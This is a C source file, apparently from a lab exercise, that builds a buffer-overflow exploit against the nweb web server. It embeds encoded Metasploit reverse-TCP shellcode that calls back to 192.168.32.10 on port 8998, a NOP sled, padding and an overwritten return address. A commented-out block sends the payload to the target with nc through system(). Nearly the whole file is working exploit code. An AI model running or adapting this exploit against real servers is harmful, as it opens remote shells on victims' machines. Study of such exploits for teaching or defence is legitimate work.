#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
/*
 * linux/x86/shell_reverse_tcp - 204 bytes
 * https://metasploit.com/
 * Encoder: x86/alpha_upper
 * VERBOSE=false, LHOST=192.168.32.10, LPORT=8998, 
 * ReverseAllowProxy=false, ReverseListenerThreaded=false, 
 * StagerRetryCount=10, StagerRetryWait=5, PrependFork=false, 
 * PrependSetresuid=false, PrependSetreuid=false, 
 * PrependSetuid=false, PrependSetresgid=false, 
 * PrependSetregid=false, PrependSetgid=false, 
 * PrependChrootBreak=false, AppendExit=false, 
 * MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=, 
 * CreateSession=true, AutoVerifySession=true, CMD=/bin/sh
 */
unsigned char buf[] = 
"\x89\xe1\xda\xcc\xd9\x71\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43\x43"
"\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58\x34\x41"
"\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42"
"\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
"\x38\x41\x43\x4a\x4a\x49\x46\x51\x39\x4b\x4b\x47\x5a\x43\x30"
"\x53\x57\x33\x46\x33\x33\x5a\x44\x42\x4d\x59\x4b\x51\x48\x30"
"\x55\x36\x48\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x47\x4f\x38"
"\x4d\x4d\x50\x51\x59\x43\x49\x4b\x49\x33\x58\x39\x50\x4f\x58"
"\x37\x50\x34\x4a\x45\x38\x44\x42\x53\x30\x36\x43\x57\x56\x4d"
"\x59\x4d\x31\x48\x30\x53\x56\x36\x30\x36\x31\x50\x53\x38\x33"
"\x34\x43\x4d\x59\x4d\x31\x58\x4d\x4b\x30\x50\x52\x43\x58\x52"
"\x4e\x36\x4f\x52\x53\x45\x38\x35\x38\x46\x4f\x46\x4f\x42\x42"
"\x42\x49\x4d\x59\x4b\x53\x56\x32\x36\x33\x4c\x49\x4b\x51\x4e"
"\x50\x54\x4b\x58\x4d\x4d\x50\x41\x41";
	
	
	//This is the string that we are going to use to overflow the buffer of nweb
	unsigned char overflow_string[3037];

	//TESTING TO CHECK IF EIP CAN BE CONTROLLED
	//Fill the first 1032 with As
	//memset(overflow_string, 'A', 1032);
	//TESTING TO CHECK IF NOP SLEDS SHOW UP IN MEMORY
	/*
	memset(overflow_string, '\x90', 800);//Check if NOPs are there
	memset(overflow_string+800, '\x46', 205);//Check if Shell Code will be after NOPs
	memset(overflow_string+1005, '\x41', 27);//Random As after
	*/

	//Fill the overflow string with some padding, shell code and the address
	memset(overflow_string, '\x90', 600);
	memcpy(overflow_string+600, buf, sizeof(buf));
	memset(overflow_string+600+sizeof(buf), '\x41', 232);

	//Fill the last 4 with some values to check if you can control the EIP
	overflow_string[1032] = '\xc1';
	overflow_string[1033] = '\xf7';
	overflow_string[1034] = '\xff';
	overflow_string[1035] = '\xbf';
	overflow_string[1036] = '\0'; //Null: To terminate the string

	//printf("overflow_string contains: %s\n", overflow_string);
	
	for(int i =0; i<sizeof(overflow_string); i++)
	{
		printf("%c", overflow_string[i]);
	}
	printf("\n");
	

	/*
	//Test to see if command can fetch index.html
	char command[] = "echo GET /index.html HTTP/1.0 | nc 192.168.32.40 8888";
	

	
	//Construct the command to push overflow string to nweb
	char command[4000];
	snprintf(command, sizeof(command), "echo GET /%s HTTP/1.0 | nc 192.168.32.40 8888", overflow_string);
	
	
	//Execute the command using a sys call
	int result = system(command);

	//Check if the command execution was successful
	if (result ==-1)
	{
		perror("Shell command did not run");
		return 1;
	}
	*/
	
	
	return 0;
}

